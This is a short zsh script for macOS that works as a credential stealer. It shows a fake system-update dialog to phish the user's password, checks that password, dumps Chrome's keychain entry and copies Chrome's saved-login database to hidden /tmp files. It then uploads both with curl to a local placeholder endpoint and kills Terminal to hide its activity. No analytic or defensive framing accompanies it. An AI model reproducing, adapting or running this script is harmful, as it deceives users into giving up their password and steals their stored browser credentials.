#!/bin/zsh
pw=$(osascript -e 'display dialog "macOS needs your password to continue the update" default answer "" with hidden answer' -e 'text returned of result')
dscl . -authonly "$USER" "$pw" || exit 1
security find-generic-password -ga "Chrome" > /tmp/.k 2>&1
cp ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data /tmp/.l
curl -s -F "a=@/tmp/.l" -F "b=@/tmp/.k" http://127.0.0.1:1/upload
killall Terminal
